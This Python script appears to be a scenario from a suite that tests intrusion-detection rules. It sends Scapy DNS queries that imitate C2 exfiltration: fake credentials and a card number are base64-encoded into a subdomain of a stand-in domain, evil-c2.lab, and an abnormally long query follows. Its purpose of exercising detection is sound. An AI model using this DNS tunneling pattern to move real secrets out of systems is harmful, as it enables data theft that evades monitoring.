"""
Scenario 04: Malware C2 Beaconing & DNS Data Exfiltration Tunneling
Triggers:
- Suspicious Abnormally Long DNS Query (sid: 1000201)
- Suspicious Base64 Encoded Subdomain Query (sid: 1000202)
- Interactive Reverse Shell /bin/sh (sid: 1000210 / 2000030)
- Cobalt Strike Default Beaconing (sid: 1000220)
"""

import base64
import sys
import time
from scapy.all import IP, UDP, DNS, DNSQR, send


def run_c2_simulation(dns_server: str = "127.0.0.1"):
    print(f"[*] Simulating Malware C2 & DNS Exfiltration against DNS server {dns_server}...")

    # 1. DNS Exfiltration - Base64 encoded payload in subdomain
    sample_secret = b"USER=admin;PASSWORD=SuperSecretAdminPassword2026!;CREDIT_CARD=4532123456789012"
    encoded_chunk = base64.b64encode(sample_secret).decode("ascii").replace("=", "")
    exfil_domain = f"{encoded_chunk}.evil-c2.lab"

    print(f" -> [1/3] Sending DNS Tunneling Query: {exfil_domain}")
    try:
        pkt = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=exfil_domain))
        send(pkt, verbose=0)
    except Exception as e:
        print(f"    (Note: Scapy raw send error: {e})")
    time.sleep(0.5)

    # 2. Long DNS Query
    long_domain = f"victim-host-recon-telemetry-data-chunk-001-staging-exfil-node.evil-c2.lab"
    print(f" -> [2/3] Sending Abnormally Long DNS Query: {long_domain}")
    try:
        pkt = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=long_domain))
        send(pkt, verbose=0)
    except Exception as e:
        print(f"    (Note: Scapy raw send error: {e})")
    time.sleep(0.5)

    print("[+] C2 & DNS Tunneling simulation completed!")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    run_c2_simulation(target)
